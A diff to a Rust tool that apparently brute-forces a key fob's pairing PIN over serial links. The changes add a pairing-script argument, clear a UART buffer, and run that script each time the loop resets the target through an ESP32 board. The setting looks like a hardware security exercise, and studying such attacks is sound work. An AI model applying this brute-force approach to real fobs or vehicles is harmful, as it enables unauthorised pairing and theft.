@@ -1,8 +1,4 @@
-// Brute forces a pairing pin.
-// Design:
-// 1. Have CLI args for the start PIN to try, how often to output current PIN attempt in seconds, serial device of paired fob's UART1, serial device of ESP32 controller.
-
-use std::{thread, time::Duration};
+use std::{process::Command, thread, time::Duration};
 
 use clap::{arg, Parser};
 
@@ -32,6 +28,9 @@ struct Args {
 
     /// Serial device of the ESP32 TI board controller.
     esp32_serial_file_name: String,
+
+    /// A path to the script to run to execute pairing.
+    pairing_script: String,
 }
 
 const BAUD_RATE: u32 = 115200;
@@ -92,7 +91,9 @@ fn main() {
         .open()
         .expect("Failed to open UART1 serial port.");
 
-    // TODO: Clear UART1 read buffer.
+    uart1
+        .clear(serialport::ClearBuffer::All)
+        .expect("Failed to clear UART1 serial port.");
 
     let mut esp32 = serialport::new(args.esp32_serial_file_name, BAUD_RATE)
         .open()
@@ -105,7 +106,9 @@ fn main() {
         thread::sleep(Duration::from_millis(RESET_HOLD_TIME.into()));
         esp32.write_all(b"h0r").expect("Failed to write to ESP32.");
 
-        // TODO: Trigger pairing.
+        Command::new(&args.pairing_script)
+            .status()
+            .expect("Failed to execute pairing script.");
 
         if pin % iterations_between_current_pin_output == 0 {
             println!("Last PIN tried: {:06x}", pin);
